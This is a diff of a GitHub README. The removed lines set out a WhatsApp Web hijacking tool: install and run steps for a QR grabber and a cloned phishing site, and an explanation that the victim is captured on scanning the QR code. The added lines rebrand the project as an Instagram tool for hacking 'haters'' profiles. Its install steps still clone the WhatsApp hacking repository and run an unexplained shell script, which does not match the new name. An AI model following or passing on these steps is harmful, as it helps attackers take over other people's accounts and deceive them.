@@ -1,26 +1,13 @@
-<h1 align="center">Whatsapp-Hacking💻</h1>
-Hack whatsapp web via a cloned website
-
-## Requirements
-
-• Python >= 3.6.3
-• Flask==1.0.2
-• Selenium==3.7.0
-• Gecko Driver
-
-
-## Before Usage
-
-change the last line of the server.py script to fit your needs (if run on port 80, you might need to run as superuser)
-router configuration might be necessary (port mapping)
+<h1 align="center">Instagram Unfollower Bot</h1>
+Hack Your Haters Insta Profile 😈 
 
 
 ### ☑️ ***Installation***:
 ```
-> pkg install python3
+> pkg update && pkg upgrade
 ```
 ```
-> pkg install git
+> pkg install git curl -y
 ```
 ```
 > git clone https://github.com/rifkykd/Whatsapp-Hacking.git
@@ -29,22 +16,10 @@ router configuration might be necessary (port mapping)
 > cd whatsapp-hacking
 ```
 ```
-> pip install -r requirements.txt
-```
-```
- > python3 grabber.py
-```
-```
-> python3 server.py
+> bash Unfollower.sh
 ```
 
-As the victim scans the qr on the fake website, whatsapp web on the browser spawned by the grabber will be connected to the victim's number.
 
-# Disclaimer
-
-THIS IS FOR DEMONSTRATIVE PURPOSES ONLY.
-
-DO NOT USE ON REAL VICTIMS FOR ANY REASON. CRIMINAL LAW WILL APPLY.
 ### CONNECT WITH ME :
 <a href="https://twitter.com/Rifky54641898">
   <img align="left" alt="Rifky KD| Twitter" width="22px" src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/twitter.svg" target="blank"/>
